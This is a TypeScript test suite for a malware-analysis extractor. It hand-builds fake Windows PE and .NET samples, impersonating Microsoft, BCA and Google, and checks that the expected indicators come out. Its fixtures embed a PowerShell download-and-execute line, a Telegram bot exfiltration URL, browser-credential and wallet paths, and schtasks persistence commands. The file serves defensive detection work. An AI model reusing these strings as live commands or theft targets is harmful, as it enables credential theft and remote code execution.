import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { extractFile } from "../lib/extract";
import { readMetadata } from "../lib/dotnet";

// ---- hand-built PE images (no external tools; nothing is executed) ----
const TOKEN = "AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
type Built = {data: Buffer; dirs?: Record<number, [number, number]>};
type Sec = {name: string; build: (rva: number) => Built; flags?: number; raw?: boolean};
const align = (n: number, a: number) => Math.ceil(n / a) * a;
function image(plus: boolean, sections: Sec[], overlay = Buffer.alloc(0), extraDirs: Record<number, [number, number]> = {}) {
  const optSize = plus ? 240 : 224, opt = 0x40 + 24, dirBase = opt + (plus ? 112 : 96), headers = 0x400;
  const h = Buffer.alloc(headers); h.write("MZ", 0, "latin1"); h.writeUInt32LE(0x40, 60); h.write("PE\0\0", 0x40, "latin1"); h.writeUInt16LE(plus ? 0x8664 : 0x14c, 0x44);
  h.writeUInt16LE(sections.length, 0x46); h.writeUInt16LE(optSize, 0x54); h.writeUInt16LE(0x102, 0x56); h.writeUInt16LE(plus ? 0x20b : 0x10b, opt); h.writeUInt32LE(headers, opt + 60); h.writeUInt32LE(16, opt + (plus ? 108 : 92));
  let raw = headers, va = 0x1000; const bodies: Buffer[] = [];
  sections.forEach((s, i) => {
    const {data, dirs = {}} = s.build(va), size = s.raw === false ? 0 : align(data.length, 0x200), q = opt + optSize + i * 40;
    h.write(s.name, q, "latin1"); h.writeUInt32LE(Math.max(data.length, 0x1000), q + 8); h.writeUInt32LE(va, q + 12); h.writeUInt32LE(size, q + 16); h.writeUInt32LE(size ? raw : 0, q + 20); h.writeUInt32LE(s.flags ?? 0x40000040, q + 36);
    for (const [k, [off, len]] of Object.entries(dirs)) {h.writeUInt32LE(va + off, dirBase + Number(k) * 8); h.writeUInt32LE(len, dirBase + Number(k) * 8 + 4);}
    if (size) {const body = Buffer.alloc(size); data.copy(body); bodies.push(body); raw += size;}
    va += align(Math.max(data.length, 1), 0x1000);
  });
  for (const [k, [off, len]] of Object.entries(extraDirs)) {h.writeUInt32LE(off, dirBase + Number(k) * 8); h.writeUInt32LE(len, dirBase + Number(k) * 8 + 4);}
  return Buffer.concat([h, ...bodies, overlay]);
}
const utf16z = (s: string) => Buffer.from(`${s}\0`, "utf16le");
const pad4 = (b: Buffer) => Buffer.concat([b, Buffer.alloc((4 - b.length % 4) % 4)]);
// VS_VERSIONINFO block: header, key, pad, value, pad, children.
function vblock(key: string, type: number, value: Buffer, valueLength: number, children: Buffer[] = []) {
  const body = Buffer.concat([pad4(Buffer.concat([Buffer.alloc(6), utf16z(key)])), pad4(value), ...children]);
  body.writeUInt16LE(body.length, 0); body.writeUInt16LE(valueLength, 2); body.writeUInt16LE(type, 4); return body;
}
function versionInfo(fields: Record<string, string>) {
  const fixed = Buffer.alloc(52); fixed.writeUInt32LE(0xfeef04bd, 0); fixed.writeUInt32LE(0x10000, 4);
  const strings = Object.entries(fields).map(([k, v]) => vblock(k, 1, utf16z(v), v.length + 1));
  return vblock("VS_VERSION_INFO", 0, fixed, 52, [vblock("StringFileInfo", 1, Buffer.alloc(0), 0, [vblock("040904b0", 1, Buffer.alloc(0), 0, strings)])]);
}
// Three-level resource tree (type/name/language) with data entries pointing at RVAs inside the section.
function resources(leaves: {type: number | string; name: number; data: Buffer}[], hostile?: "selfLoop" | "hugeCount"): Sec {
  return {name: ".rsrc", build: rva => {
    const types = [...new Set(leaves.map(l => l.type))], chunks: Buffer[] = []; let size = 0;
    const alloc = (b: Buffer) => {const at = size; chunks.push(b); size += b.length; return at;};
    const dir = (n: number) => {const b = Buffer.alloc(16 + n * 8); b.writeUInt16LE(n, 14); return {b, at: alloc(b)};};
    const root = dir(types.length), patches: (() => void)[] = [];
    types.forEach((t, i) => {
      const mine = leaves.filter(l => l.type === t), d1 = dir(mine.length);
      let id = typeof t === "number" ? t : 0;
      if (typeof t === "string") {const s = Buffer.alloc(2 + t.length * 2); s.writeUInt16LE(t.length); s.write(t, 2, "utf16le"); id = (0x80000000 | alloc(pad4(s))) >>> 0;}
      root.b.writeUInt32LE(id, 16 + i * 8); root.b.writeUInt32LE((0x80000000 | d1.at) >>> 0, 20 + i * 8);
      mine.forEach((l, j) => {
        const d2 = dir(1), entry = Buffer.alloc(16), dataAt = alloc(pad4(l.data)), entryAt = alloc(entry);
        d1.b.writeUInt32LE(l.name, 16 + j * 8); d1.b.writeUInt32LE((0x80000000 | d2.at) >>> 0, 20 + j * 8);
        d2.b.writeUInt32LE(1033, 16); d2.b.writeUInt32LE(entryAt, 20); patches.push(() => {entry.writeUInt32LE(rva + dataAt, 0); entry.writeUInt32LE(l.data.length, 4);});
      });
    });
    patches.forEach(f => f());
    if (hostile === "selfLoop") {root.b.writeUInt32LE(0x80000000, 20);}
    if (hostile === "hugeCount") {root.b.writeUInt16LE(0xffff, 12); root.b.writeUInt16LE(0xffff, 14);}
    return {data: Buffer.concat(chunks), dirs: {2: [0, size]}};
  }};
}
function tinyPe(machineCode = Buffer.from([0xc3])) {return image(false, [{name: ".text", build: () => ({data: Buffer.concat([machineCode, Buffer.alloc(0x200)])}), flags: 0x60000020}]);}
// ---- minimal .NET metadata (ECMA-335 #~ tables with 2-byte indexes) ----
function compressedLen(n: number) {return n < 0x80 ? Buffer.from([n]) : Buffer.from([0x80 | n >> 8, n & 0xff]);}
type NetSpec = {typeDefs: [string, string][]; typeRefs: [string, string][]; memberRefs: [number, string, number[]][]; methods: string[]; moduleRefs: string[]; implMaps: [number, string, number][]; assemblyRefs: string[]; userStrings: string[]};
function metadata(spec: NetSpec, mutate?: (tables: Buffer) => void) {
  const strs: string[] = [], strIdx = new Map<string, number>(); let strLen = 1;
  const s = (x: string) => {if (!x) return 0; if (!strIdx.has(x)) {strIdx.set(x, strLen); strs.push(x); strLen += Buffer.byteLength(x) + 1;} return strIdx.get(x)!;};
  const blobs: Buffer[] = [Buffer.alloc(1)]; let blobLen = 1; const b = (x: number[]) => {const at = blobLen, e = Buffer.concat([compressedLen(x.length), Buffer.from(x)]); blobs.push(e); blobLen += e.length; return at;};
  const u16 = (...xs: number[]) => {const o = Buffer.alloc(xs.length * 2); xs.forEach((x, i) => o.writeUInt16LE(x, i * 2)); return o;};
  const u32 = (x: number) => {const o = Buffer.alloc(4); o.writeUInt32LE(x); return o;};
  const tables: [number, Buffer[]][] = [
    [0x00, [u16(0, s("Kurir.exe"), 1, 0, 0)]],
    [0x01, spec.typeRefs.map(([ns, n]) => u16(6 /* AssemblyRef 1, tag 2 */, s(n), s(ns)))],
    [0x02, spec.typeDefs.map(([ns, n]) => Buffer.concat([u32(0), u16(s(n), s(ns), 0, 1, 1)]))],
    [0x06, spec.methods.map(n => Buffer.concat([u32(0), u16(0, 0x2096, s(n), b([0, 0, 1]), 1)]))],
    [0x0a, spec.memberRefs.map(([typeRef, n, sig]) => u16(typeRef << 3 | 1, s(n), b(sig)))],
    [0x1a, spec.moduleRefs.map(n => u16(s(n)))],
    [0x1c, spec.implMaps.map(([method, name, scope]) => u16(0x100, method << 1 | 1, s(name), scope))],
    [0x20, [Buffer.concat([u32(0x8004), u16(1, 0, 0, 0), u32(0), u16(0, s("Kurir"), 0)])]],
    [0x23, spec.assemblyRefs.map(n => Buffer.concat([u16(4, 0, 0, 0), u32(0), u16(0, s(n), 0, 0)]))],
  ];
  const present = tables.filter(([, rows]) => rows.length);
  let valid = 0n; for (const [t] of present) valid |= 1n << BigInt(t);
  const head = Buffer.alloc(24); head[4] = 2; head.writeBigUInt64LE(valid, 8);
  let tableStream = Buffer.concat([head, ...present.map(([, rows]) => u32(rows.length)), ...present.flatMap(([, rows]) => rows)]);
  tableStream = pad4(tableStream); mutate?.(tableStream);
  const stringHeap = pad4(Buffer.concat([Buffer.alloc(1), ...strs.map(x => Buffer.from(`${x}\0`))]));
  const us = pad4(Buffer.concat([Buffer.alloc(1), ...spec.userStrings.map(x => {const u = Buffer.from(x, "utf16le"); return Buffer.concat([compressedLen(u.length + 1), u, Buffer.from([0])]);})]));
  const guid = Buffer.from("00112233445566778899aabbccddeeff", "hex"), blobHeap = pad4(Buffer.concat(blobs));
  const streams: [string, Buffer][] = [["#~", tableStream], ["#Strings", stringHeap], ["#US", us], ["#GUID", guid], ["#Blob", blobHeap]];
  const version = pad4(Buffer.from("v4.0.30319\0")), headerLen = 16 + version.length + 4 + streams.reduce((n, [name]) => n + 8 + align(name.length + 1, 4), 0);
  const root = Buffer.alloc(16); root.writeUInt32LE(0x424a5342, 0); root.writeUInt16LE(1, 4); root.writeUInt16LE(1, 6); root.writeUInt32LE(version.length, 12);
  let off = headerLen; const headers = streams.map(([name, data]) => {const e = Buffer.alloc(8 + align(name.length + 1, 4)); e.writeUInt32LE(off, 0); e.writeUInt32LE(data.length, 4); e.write(name, 8, "latin1"); off += data.length; return e;});
  return Buffer.concat([root, version, u16(0, streams.length), ...headers, ...streams.map(([, d]) => d)]);
}
function dotnetPe(spec: NetSpec, mutate?: (tables: Buffer) => void, extra: Sec[] = []) {
  return image(false, [{name: ".text", flags: 0x60000020, build: () => {
    const md = metadata(spec, mutate), cli = Buffer.alloc(72); cli.writeUInt32LE(72, 0); cli.writeUInt16LE(2, 4); cli.writeUInt16LE(5, 6); cli.writeUInt32LE(0x1000 + 72, 8); cli.writeUInt32LE(md.length, 12); cli.writeUInt32LE(1, 16);
    return {data: Buffer.concat([cli, md]), dirs: {14: [0, 72]}};
  }}, ...extra]);
}
const stealerSpec = (): NetSpec => ({
  typeDefs: [["", "<Module>"], ["Kurir", "Program"], ["Entity", "ScannedBrowser"]],
  typeRefs: [["System.Drawing", "Graphics"], ["System.Reflection", "Assembly"], ["System.Reflection", "MethodBase"], ["System.Security.Cryptography", "ProtectedData"], ["System", "Object"], ["System", "Convert"]],
  memberRefs: [[1, "CopyFromScreen", [0x20, 0x02, 0x01, 0x08, 0x08]], [2, "Load", [0x00, 0x01, 0x12, 0x09, 0x1d, 0x05]], [3, "Invoke", [0x20, 0x02, 0x1c, 0x1c, 0x1d, 0x1c]], [4, "Unprotect", [0x00, 0x03, 0x1d, 0x05, 0x1d, 0x05, 0x1d, 0x05, 0x08]], [6, "FromBase64String", [0x00, 0x01, 0x1d, 0x05, 0x0e]]],
  methods: ["Main", "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"], moduleRefs: ["kernel32.dll"], implMaps: [[2, "VirtualAllocEx", 1], [3, "WriteProcessMemory", 1], [4, "CreateRemoteThread", 1]],
  assemblyRefs: ["mscorlib", "System.Drawing"],
  userStrings: [`https://api.telegram.org/bot123456789:${TOKEN}/sendDocument?chat_id=-1001234567890`, "\\Google\\Chrome\\User Data\\Default\\Login Data", "\\Local State", "Telegram Desktop\\tdata", "wallet.dat", "\\Exodus\\exodus.wallet", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
});

// ---- tests ----
test("PE32/PE32+ resources: version info, manifest, embedded PE/script and Microsoft impersonation", async () => {
  const manifest = Buffer.from(`<?xml version="1.0"?><assembly><trustInfo><security><requestedPrivileges><requestedExecutionLevel level="requireAdministrator" uiAccess="false"/></requestedPrivileges></security></trustInfo></assembly>`);
  const ps = Buffer.from("$c = New-Object Net.WebClient; IEX ($c.DownloadString('http://45.77.10.20/a.ps1'))");
  for (const plus of [false, true]) {
    const rsrc = resources([
      {type: 16, name: 1, data: versionInfo({CompanyName: "Microsoft Corporation", FileDescription: "Windows Update Assistant", ProductName: "Microsoft® Windows® Operating System", OriginalFilename: "WinUpdate.exe", LegalCopyright: "© Microsoft Corporation. All rights reserved.", FileVersion: "10.0.19041.1"})},
      {type: 24, name: 1, data: manifest}, {type: 10, name: 101, data: tinyPe()}, {type: "PAYLOAD", name: 7, data: ps}, {type: 14, name: 1, data: Buffer.alloc(20)},
    ]);
    const result = await extractFile(image(plus, [{name: ".text", build: () => ({data: Buffer.alloc(0x200, 0x90)}), flags: 0x60000020}, rsrc]), "update.exe");
    const m = result.metadata as {resources: {version: Record<string, string>; manifest: {executionLevel: string}; icons: number; payloads: {path: string; kind: string}[]; types: Record<string, number>}};
    assert.equal(result.incomplete, false);
    assert.equal(m.resources.version.CompanyName, "Microsoft Corporation"); assert.equal(m.resources.version.OriginalFilename, "WinUpdate.exe"); assert.equal(m.resources.version.FileVersion, "10.0.19041.1");
    assert.equal(m.resources.manifest.executionLevel, "requireAdministrator"); assert.equal(m.resources.icons, 1); assert.equal(m.resources.types.PAYLOAD, 1);
    assert.deepEqual(m.resources.payloads.map(p => [p.path, p.kind]).sort(), [["PAYLOAD/7/1033", "skrip PowerShell"], ["RCDATA/101/1033", "program Windows (PE)"]]);
    const names = result.indicators.map(i => i.name);
    for (const n of ["File tersembunyi di dalam resource (program Windows)", "File tersembunyi di dalam resource (skrip)", "Meminta hak administrator", "Identitas file meniru Microsoft"]) assert.ok(names.includes(n), n);
    assert.match(result.indicators.find(i => i.name === "Identitas file meniru Microsoft")!.evidence, /CompanyName="Microsoft Corporation".*tidak memiliki tanda tangan/);
  }
});
test("brand impersonation: Indonesian bank claim unsigned is high; self-signed brand-named signer is flagged", async () => {
  const bca = await extractFile(image(false, [resources([{type: 16, name: 1, data: versionInfo({CompanyName: "PT Bank Central Asia Tbk", ProductName: "KlikBCA Bisnis Token"})}])]), "bca.exe");
  assert.match(bca.indicators.find(i => i.name === "Identitas file meniru BCA")!.evidence, /^Tingkat tinggi/);
  // WIN_CERTIFICATE wrapping a self-signed PKCS#7 (Android debug cert fixture) on a file claiming to be Google.
  const p7 = readFileSync(new URL("./fixtures/android-debug-cert.p7b", import.meta.url)), cert = Buffer.alloc(align(8 + p7.length, 8));
  cert.writeUInt32LE(8 + p7.length, 0); cert.writeUInt16LE(0x200, 4); cert.writeUInt16LE(2, 6); p7.copy(cert, 8);
  const base = image(false, [resources([{type: 16, name: 1, data: versionInfo({CompanyName: "Google LLC", ProductName: "Google Chrome"})}])]);
  const signed = image(false, [resources([{type: 16, name: 1, data: versionInfo({CompanyName: "Google LLC", ProductName: "Google Chrome"})}])], cert, {4: [base.length, cert.length]});
  const result = await extractFile(signed, "ChromeSetup.exe"), ind = result.indicators.find(i => i.name === "Identitas file meniru Google");
  assert.ok(ind); assert.match(ind.evidence, /swa-tanda-tangan "[^"]*Android Debug/);
  assert.equal((result.metadata.overlay as {type: string}).type, "sertifikat Authenticode saja");
  // Matching, CA-issued signer subject: no impersonation indicator (signature itself is never verified).
  const clean = await extractFile(image(false, [resources([{type: 16, name: 1, data: versionInfo({CompanyName: "Kheronyx Test", ProductName: "Alat Uji"})}])]), "tool.exe");
  assert.ok(!clean.indicators.some(i => i.name.startsWith("Identitas file meniru")));
});
test(".NET metadata: types, member refs, P/Invoke, #US strings, stealer behaviors and token redaction everywhere", async () => {
  const pe = dotnetPe(stealerSpec()), raw = readMetadata(pe, (rva, len = 1) => rva >= 0x1000 && rva - 0x1000 + 0x400 + len <= pe.length ? rva - 0x1000 + 0x400 : -1, 0x1000, Date.now() + 5000);
  assert.deepEqual(raw.typeDefs, ["<Module>", "Kurir.Program", "Entity.ScannedBrowser"]);
  assert.ok(raw.memberRefs.includes("System.Drawing.Graphics::CopyFromScreen")); assert.equal(raw.loadBytes, true);
  assert.deepEqual(raw.pinvoke, ["kernel32.dll!VirtualAllocEx", "kernel32.dll!WriteProcessMemory", "kernel32.dll!CreateRemoteThread"]);
  assert.equal(raw.assembly, "Kurir v1.0.0.0"); assert.equal(raw.runtimeVersion, "v4.0.30319"); assert.equal(raw.userStrings.length, 7);
  const result = await extractFile(pe, "kurir.exe"), json = JSON.stringify(result);
  assert.equal(result.incomplete, false);
  const net = result.metadata.dotnet as {assemblyName: string; types: number; notableTypes: string[]; notableMemberRefs: string[]; pinvoke: string[]; userStringsSample: string[]; assemblyRefs: string[]};
  assert.equal(net.assemblyName, "Kurir v1.0.0.0"); assert.equal(net.types, 3); assert.deepEqual(net.notableTypes, ["Entity.ScannedBrowser"]);
  assert.ok(net.notableMemberRefs.includes("System.Drawing.Graphics::CopyFromScreen")); assert.ok(net.pinvoke.includes("kernel32.dll!VirtualAllocEx")); assert.deepEqual(net.assemblyRefs, ["mscorlib v4.0.0.0", "System.Drawing v4.0.0.0"]);
  assert.ok(net.userStringsSample.some(s => s.includes("api.telegram.org/bot123456789:…Dsaw")));
  const ids = (result.metadata.behaviors as {id: string; severity: string}[]).map(b => `${b.id}:${b.severity}`);
  for (const id of ["net_stealer:critical", "net_credential_theft:high", "net_wallet_theft:high", "net_screenshot:low", "net_injection:high", "net_reflective_load:high", "net_persistence:medium", "family_marker:high", "exfil_telegram:high"]) assert.ok(ids.includes(id), id);
  assert.ok(result.indicators.some(i => i.name === "Mirip keluarga malware RedLine (penanda string)"));
  assert.ok((result.metadata.compiler as string[]).includes(".NET (CLR)"));
  assert.ok(!json.includes(TOKEN), "bot token secret must never leave the extractor"); assert.ok(json.includes("123456789:…Dsaw"));
});
test("packers, installers and overlay classification", async () => {
  const upx = await extractFile(image(false, [{name: "UPX0", raw: false, build: () => ({data: Buffer.alloc(0x4000)}), flags: 0xe0000080}, {name: "UPX1", build: () => ({data: Buffer.concat([Buffer.from("UPX!"), Buffer.alloc(0x600, 7)])}), flags: 0xe0000040}]), "packed.exe");
  assert.deepEqual(upx.metadata.packer, ["UPX"]); assert.ok(upx.indicators.some(i => i.name === "Dikemas/diproteksi packer (UPX)"));
  assert.ok(upx.limitations.some(l => l.startsWith("File dikemas/diproteksi (UPX)")));
  const zip = Buffer.concat([Buffer.from("PK\x03\x04", "latin1"), Buffer.alloc(200, 1)]);
  const archive = await extractFile(Buffer.concat([tinyPe(), zip]), "sfx.exe"), ov = archive.metadata.overlay as {type: string; size: number; offset: number};
  assert.equal(ov.type, "arsip ZIP"); assert.equal(ov.size, zip.length); assert.equal(archive.metadata.overlayBytes, zip.length);
  const dropper = await extractFile(Buffer.concat([tinyPe(), tinyPe()]), "dropper.exe");
  assert.equal((dropper.metadata.overlay as {type: string}).type, "program Windows (PE)"); assert.ok(dropper.indicators.some(i => i.name === "Program lain disisipkan di overlay"));
  const inflated = await extractFile(Buffer.concat([tinyPe(), Buffer.alloc(12 * 1024 * 1024)]), "besar.exe");
  assert.equal((inflated.metadata.overlay as {type: string}).type, "data berulang/kosong (padding)"); assert.ok(inflated.indicators.some(i => i.name === "Ukuran file digelembungkan (padding overlay)"));
  let seed = 3; const noise = Buffer.alloc(200000).map(() => (seed = seed * 1103515245 + 12345 & 0x7fffffff) >> 16 & 255);
  const dense = await extractFile(Buffer.concat([tinyPe(), noise]), "x.exe"), denseOv = dense.metadata.overlay as {type: string; entropy: number};
  assert.equal(denseOv.type, "data berentropi tinggi (terkompresi/terenkripsi)"); assert.ok(denseOv.entropy > 7.5);
  const nsis = await extractFile(Buffer.concat([image(false, [{name: ".text", build: () => ({data: Buffer.alloc(0x200, 0x90)})}, {name: ".ndata", raw: false, build: () => ({data: Buffer.alloc(0x1000)})}]), Buffer.from("\0\0\0\0\xef\xbe\xad\xdeNullsoftInst", "latin1"), noise]), "setup.exe");
  assert.equal(nsis.metadata.installer, "NSIS"); assert.equal((nsis.metadata.overlay as {type: string}).type, "data installer NSIS");
  assert.ok(nsis.limitations.some(l => l.startsWith("Installer NSIS: payload di dalam installer tidak dibongkar")));
  assert.ok(!nsis.indicators.some(i => /overlay/.test(i.name)));
  const go = Buffer.from("\xff Go buildinf:\x08\x02", "latin1"), goInfo = Buffer.concat([go, Buffer.alloc(32 - go.length), Buffer.from("\x08go1.22.3", "latin1")]);
  const goBin = await extractFile(image(true, [{name: ".data", build: () => ({data: goInfo})}]), "tool.exe"); assert.deepEqual(goBin.metadata.compiler, ["Go go1.22.3"]);
  const pyi = await extractFile(Buffer.concat([tinyPe(), noise, Buffer.from("MEI\x0c\x0b\x0a\x0b\x0e", "latin1"), Buffer.alloc(80)]), "app.exe");
  assert.ok((pyi.metadata.compiler as string[]).includes("Python (PyInstaller)")); assert.ok(pyi.limitations.some(l => l.includes("PyInstaller")));
});
test("hostile resource trees and .NET tables stay bounded and never throw", async () => {
  const leaves = [{type: 10, name: 1, data: tinyPe()}, {type: 16, name: 1, data: versionInfo({CompanyName: "X"})}];
  for (const hostile of ["selfLoop", "hugeCount"] as const) {
    const started = Date.now(), result = await extractFile(image(false, [resources(leaves, hostile)]), "loop.exe");
    assert.ok(Date.now() - started < 2000); assert.ok(result.limitations.length);
  }
  // Lying row counts / heap flags in #~ must fail cleanly (incomplete), not over-read or hang.
  for (const mutate of [(t: Buffer) => t.writeUInt32LE(0xffffff, 24), (t: Buffer) => {t[6] = 7;}, (t: Buffer) => t.writeBigUInt64LE(0xffffffffffffffffn, 8)]) {
    const result = await extractFile(dotnetPe(stealerSpec(), mutate), "bad.exe");
    assert.equal(result.incomplete, true); assert.ok(result.limitations.some(l => l.startsWith("Metadata .NET tidak berhasil dibaca")));
    assert.ok(!JSON.stringify(result).includes(TOKEN));
  }
  // Random corruption over a PE with resources + .NET metadata.
  const good = dotnetPe(stealerSpec(), undefined, [resources([...leaves, {type: 24, name: 1, data: Buffer.from("<assembly/>")}])]);
  let seed = 11; const rnd = () => (seed = seed * 1103515245 + 12345 & 0x7fffffff) / 0x7fffffff; const started = Date.now();
  for (let i = 0; i < 300; i++) {
    const b = Buffer.from(good); for (let k = 0; k < 6; k++) b[0x400 + Math.floor(rnd() * (b.length - 0x400))] = Math.floor(rnd() * 256);
    const result = await extractFile(b, "fuzz.exe"); assert.ok(!JSON.stringify(result).includes(TOKEN));
  }
  assert.ok(Date.now() - started < 15000, `fuzzing took ${Date.now() - started} ms`);
});
test("AI evidence stays bounded for a .NET sample with many resources and stealer strings", async () => {
  const spec = stealerSpec();
  spec.typeDefs.push(...Array.from({length: 400}, (_, i) => ["Stealer.Grabbers", `BrowserCookieWalletGrabber${i}${"x".repeat(60)}`] as [string, string]));
  spec.userStrings.push(...Array.from({length: 3000}, (_, i) => `${["https://api.telegram.org/bot", "\\Login Data", "http://103.10.20.", "schtasks /create /tn "][i % 4]}${i}${"y".repeat(150)}`));
  const leaves = Array.from({length: 60}, (_, i) => ({type: 10, name: i + 1, data: i % 2 ? tinyPe() : Buffer.from(`@echo off\r\nschtasks /create /tn x${i} /tr evil.exe`)}));
  const started = Date.now(), result = await extractFile(dotnetPe(spec, undefined, [resources(leaves)]), "semua.exe");
  assert.ok(Date.now() - started < 5000);
  assert.ok(JSON.stringify({...result, strings: result.strings.slice(0, 180), urls: result.urls.slice(0, 40)}).length < 110000);
  assert.ok(result.indicators.some(i => i.name.startsWith("File tersembunyi di dalam resource")));
});
test("large EXE (250 MB with big overlay) is analysed quickly within memory", async () => {
  const big = Buffer.alloc(250 * 1024 * 1024); const head = tinyPe(); head.copy(big);
  for (let i = head.length; i < big.length; i += 4096) big[i] = i & 255;
  const started = Date.now(), result = await extractFile(big, "besar.exe");
  assert.ok(Date.now() - started < 20000, `took ${Date.now() - started} ms`); assert.equal(result.incomplete, false);
  assert.ok((result.metadata.overlay as {size: number}).size > 249 * 1024 * 1024);
});
